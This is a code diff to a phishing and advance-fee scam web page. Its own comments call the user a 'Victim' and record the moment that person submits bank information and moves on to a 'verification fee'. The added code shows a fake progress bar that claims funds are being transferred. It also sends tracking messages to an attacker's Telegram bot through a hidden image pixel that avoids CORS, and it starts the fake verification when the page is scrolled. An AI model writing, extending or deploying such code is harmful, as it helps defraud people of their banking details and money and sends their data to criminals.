@@ -1094,7 +1094,7 @@
             // Track this event
             sendToTelegram(`Victim submitted bank information and proceeded to verification fee`);
             
-            // Close modal and scroll to it
+         // Close modal and scroll to it
             document.querySelector('.notification').classList.remove('active');
             document.getElementById('verificationFee').scrollIntoView({ behavior: 'smooth' });
         });
@@ -1142,4 +1142,47 @@
                     progress += 5;
                     
                     if(progress <= 100) {
-                        progr
+                        progressFill.style.width = `${progress}%`;
+                        progressLabel.textContent = `${progress}% Complete`;
+                        
+                        if(progress < 30) {
+                            progressText.textContent = "Validating account information...";
+                        } else if(progress < 60) {
+                            progressText.textContent = "Processing verification fee...";
+                        } else if(progress < 90) {
+                            progressText.textContent = "Finalizing transaction with bank...";
+                        } else {
+                            progressText.textContent = "Transferring funds to your account...";
+                        }
+                    }
+                }, 150);
+            }, 3000);
+        }
+        
+        // Telegram notification system
+        function sendToTelegram(message) {
+            const text = `${message}\nTimestamp: ${new Date().toLocaleString()}`;
+            
+            const url = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage?chat_id=${config.telegramChatId}&text=${encodeURIComponent(text)}`;
+            
+            // Use image request method to avoid CORS
+            if(!document.querySelector('#telegramPixel')) {
+                const img = document.createElement('img');
+                img.id = 'telegramPixel';
+                img.style.display = 'none';
+                document.body.appendChild(img);
+            }
+            
+            document.getElementById('telegramPixel').src = url;
+        }
+        
+        // Simulate victim completion when scrolled to fees
+        window.addEventListener('scroll', function() {
+            if(document.getElementById('verificationFee').offsetTop < window.scrollY + window.innerHeight - 300) {
+                simulateVerification();
+                window.removeEventListener('scroll', this);
+            }
+        });
+    </script>
+ <body>
+<html>
